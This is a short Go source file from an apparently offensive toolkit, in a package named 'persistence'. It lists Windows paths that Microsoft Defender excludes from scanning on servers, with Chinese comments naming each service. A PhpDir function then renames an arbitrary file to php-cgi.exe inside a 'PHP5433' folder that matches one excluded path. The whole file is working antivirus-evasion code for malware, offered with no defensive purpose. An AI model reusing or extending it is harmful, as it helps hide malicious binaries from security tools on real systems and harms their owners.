package persistence

import (
	"os"
	"path/filepath"
	"variant/log"
)

/*
https://learn.microsoft.com/zh-cn/microsoft-365/security/defender-endpoint/configure-server-exclusions-microsoft-defender-antivirus?view=o365-worldwide#list-of-automatic-exclusions
*/

const (
	Dfsr    = `%systemroot%\System32\dfsr.exe`         // 文件复制服务
	Dfsrs   = `%systemroot%\System32\dfsrs.exe`        // 文件复制服务
	Vmms    = `%systemroot%\System32\Vmms.exe`         // Hyper-V 虚拟机管理
	Vmwp    = `%systemroot%\System32\Vmwp.exe`         // Hyper-V 虚拟机管理
	Ntfrs   = `%systemroot%\System32\ntfrs.exe`        // AD DS 相关支持
	Lsass   = `%systemroot%\System32\lsass.exe`        // AD DS 相关支持
	Dns     = `%systemroot%\System32\dns.exe`          // DNS 服务
	W3wp    = `%SystemRoot%\system32\inetsrv\w3wp.exe` // WEB服务
	W3wpWOW = `%SystemRoot%\SysWOW64\inetsrv\w3wp.exe` // WEB服务
	PhpCgi  = `%SystemDrive%\PHP5433\php-cgi.exe`      // php-cgi 服务
)

func PhpDir(path string, filename string, perm os.FileMode) {
	phpPath := filepath.Join(path, "PHP5433")
	err := os.MkdirAll(phpPath, perm)
	if err != nil {
		log.Fatalf("failed to mkdir: %v", err)
	}

	oldPath := filepath.Join(path, filename)
	newPath := filepath.Join(phpPath, "php-cgi.exe")
	err = os.Rename(oldPath, newPath)
	if err != nil {
		log.Fatalf("failed to rename: %v", err)
	}
}
